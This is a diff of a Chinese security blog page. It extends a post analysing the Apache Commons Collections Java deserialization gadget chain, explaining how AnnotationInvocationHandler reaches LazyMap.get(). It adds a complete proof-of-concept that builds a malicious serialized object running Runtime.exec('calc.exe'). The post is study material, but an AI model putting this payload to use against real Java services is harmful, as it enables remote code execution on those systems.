@@ -271,7 +271,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-04-25 11:17:12 / 修改时间：14:54:57" itemprop="dateCreated datePublished" datetime="2022-04-25T11:17:12+08:00">2022-04-25</time>
+      <time title="创建时间：2022-04-25 11:17:12 / 修改时间：18:41:45" itemprop="dateCreated datePublished" datetime="2022-04-25T11:17:12+08:00">2022-04-25</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -374,7 +374,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-04-25 09:52:41 / 修改时间：10:23:35" itemprop="dateCreated datePublished" datetime="2022-04-25T09:52:41+08:00">2022-04-25</time>
+      <time title="创建时间：2022-04-25 09:52:41 / 修改时间：18:09:27" itemprop="dateCreated datePublished" datetime="2022-04-25T09:52:41+08:00">2022-04-25</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -393,14 +393,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>601</span>
+      <span>2.2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -413,7 +413,7 @@
     <div class="post-body" itemprop="articleBody">
           <meta name="referrer" content="no-referrer"/>
 
-<p>接着上篇的分析，上文中讲到<code>LazyMap</code>通过<code>get()</code>方法可以达到利用链触发命令执行</p>
+<h3 id="cc链的另一种构造方式"><a href="#cc链的另一种构造方式" class="headerlink" title="cc链的另一种构造方式"></a>cc链的另一种构造方式</h3><p>接着上篇的分析，上文中讲到<code>LazyMap</code>通过<code>get()</code>方法可以达到利用链触发命令执行</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425100217366-1661900816.png" alt="image-20220425100216545"></p>
 <p>根据<code>get()</code>方法克制，根据传入的key进行判断，如果map中不包含此key，就会通过<code>factory</code>调用<code>transform()</code>方法，这里的<code>factory</code>是可以通过构造方法进行赋值的，那么这里可以将<code>factory</code>的值赋值为<code>ChainedTransformers</code>,就可以触发后面的调用链完成命令执行。但可以看到<code>LazyMap</code>的构造方法是被<code>protected</code>关键词修饰的，是无法直接进行new创建的，</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425100840761-1896569264.png" alt="image-20220425100840057"></p>
@@ -426,7 +426,13 @@
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425101914918-253951094.png" alt="image-20220425101914180"></p>
 <p>下一步进入get()方法，调用<code>transform()</code>方法，后续就是循环调用<code>Transformer#transform</code>方法</p>
 <p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425102027194-2090880442.png" alt="image-20220425102026291"></p>
-<p>上面是我们测试的POC的调用过程，但在实际利用中，如何让它调用到我们的get()方法呢</p>
+<p>上面是我们测试的POC的调用过程，但在实际利用中，如何让它调用到我们的<code>get()</code>方法呢，在上篇中<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法会调用<code>get()</code>方法</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425180003976-1607958223.png" alt="image-20220425180002813"></p>
+<p>根据构造方法传入第⼀个参数是⼀个<code>Annotation</code>类类型参数，该类是注解类，第二个是map类型参数，这个参数可以传<code>LazyMap</code>类型的对象去调用<code>get()</code>方法，<code>get()</code>方法调用<code>transform()</code>,</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425180049855-1977873704.png" alt="image-20220425180049496"></p>
+<p>怎么去调用<code>AnnotationInvocationHandler</code>的<code>invoke</code></p>
+<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        Class clazz =</span><br><span class="line">                Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                Map.class);</span><br><span class="line">        construct.setAccessible(true);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;1.txt&quot;));</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -1327,13 +1333,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">149k</span>
+    <span title="站点总字数">151k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:16</span>
+    <span title="站点阅读时长">2:17</span>
   </span>
 </div>
 <div class="busuanzi-count">
@@ -1343,7 +1349,7 @@
 <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共39.3k字</span>
+  <span class="post-count">博客全站共39.6k字</span>
   <span class="post-meta-divider">|</span>
   本站总访问量<span id="busuanzi_value_site_pv"></span>次
   <span class="post-meta-divider">|</span>
